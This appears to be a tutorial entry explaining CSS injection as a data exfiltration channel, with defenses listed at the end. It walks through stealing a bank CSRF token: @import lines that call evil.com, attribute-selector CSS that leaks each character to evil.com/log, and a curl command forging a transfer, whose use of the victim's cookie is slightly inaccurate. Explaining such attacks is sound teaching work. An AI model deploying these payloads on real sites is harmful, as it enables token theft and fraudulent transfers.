# 02 - CSS-Based Data Exfiltration

## The Technique

```html
<style>
@import url("http://www.a.com/test.html");
</style>

<script>
setTimeout(function(){
  var t = document.body.currentStyle.fontFamily;
  alert(t);
}, 2000);
</script>
```

### How It Works

1. `@import url(...)` loads a remote resource as a stylesheet — the browser fetches it regardless of whether it's valid CSS
2. The remote server at `a.com` can return CSS that sets properties like `font-family` to arbitrary values containing exfiltrated data
3. After a 2-second delay (to wait for the import to load), the script reads `document.body.currentStyle.fontFamily` to extract the value set by the attacker-controlled stylesheet
4. The attacker effectively uses CSS as a data channel

### Why This Matters

- `@import` bypasses many XSS filters that only look for `<script>` tags
- CSS injection is often overlooked — if an attacker can inject into a `<style>` block, they can load external resources
- `currentStyle` is IE-specific (modern equivalent: `getComputedStyle`), so this targets older IE browsers
- The technique can be chained: the imported CSS can set values based on attribute selectors, leaking page content character by character

### Full Attack Scenario: Stealing a CSRF Token via CSS

Imagine a banking site at `bank.com` that renders a hidden CSRF token in a form:

```html
<!-- bank.com/transfer page -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="9f86d081884c7d65" />
  <input type="text" name="amount" />
  <button type="submit">Transfer</button>
</form>
```

#### Step 1: Attacker Injects CSS (via a stored XSS in a profile field, comment, etc.)

The attacker finds that the site allows custom CSS or doesn't sanitize a field that ends up in a `<style>` block. They inject:

```html
<style>
@import url("http://evil.com/steal.php");
</style>
```

#### Step 2: Attacker's Server (`evil.com/steal.php`) Returns Attribute-Selector CSS

The server dynamically generates CSS that uses attribute selectors to match the CSRF token character by character:

```css
/* Each rule matches if the csrf_token value starts with that prefix */
input[name="csrf_token"][value^="0"] { background: url("http://evil.com/log?char=0&pos=1"); }
input[name="csrf_token"][value^="1"] { background: url("http://evil.com/log?char=1&pos=1"); }
input[name="csrf_token"][value^="2"] { background: url("http://evil.com/log?char=2&pos=1"); }
/* ... */
input[name="csrf_token"][value^="9"] { background: url("http://evil.com/log?char=9&pos=1"); }
input[name="csrf_token"][value^="a"] { background: url("http://evil.com/log?char=a&pos=1"); }
/* ... through f */
```

When the browser applies these styles, only the rule matching the actual first character fires — the browser requests `http://evil.com/log?char=9&pos=1`, leaking that the token starts with `9`.

#### Step 3: Attacker Iterates to Extract the Full Token

The attacker's server now knows position 1 is `9`. On the next request it returns CSS for position 2:

```css
input[name="csrf_token"][value^="90"] { background: url("http://evil.com/log?char=0&pos=2"); }
input[name="csrf_token"][value^="91"] { background: url("http://evil.com/log?char=1&pos=2"); }
/* ... */
input[name="csrf_token"][value^="9f"] { background: url("http://evil.com/log?char=f&pos=2"); }
```

The browser hits `http://evil.com/log?char=f&pos=2` — now the attacker knows `9f`. This repeats via recursive `@import` calls until the full token `9f86d081884c7d65` is extracted.

#### Step 4: Attacker Uses the Token

```bash
curl -X POST https://bank.com/transfer \
  -H "Cookie: session=victim_session_cookie" \
  -d "csrf_token=9f86d081884c7d65&amount=10000&to=attacker_account"
```

The server sees a valid CSRF token and processes the transfer.

#### Why This Works

- No `<script>` tags involved — pure CSS, bypasses many XSS filters
- Hidden inputs are still matched by CSS attribute selectors even though they're not visible
- Each character leak is a separate HTTP request to the attacker's server — looks like normal resource loading
- Recursive `@import` allows multi-round extraction in a single page load

### Defenses

- Content Security Policy (CSP) with `style-src` directive to restrict stylesheet origins
- Sanitize user input that could end up in `<style>` blocks
- Block `@import` in user-controlled CSS
- Use CSP `connect-src` and `default-src` to limit outbound connections
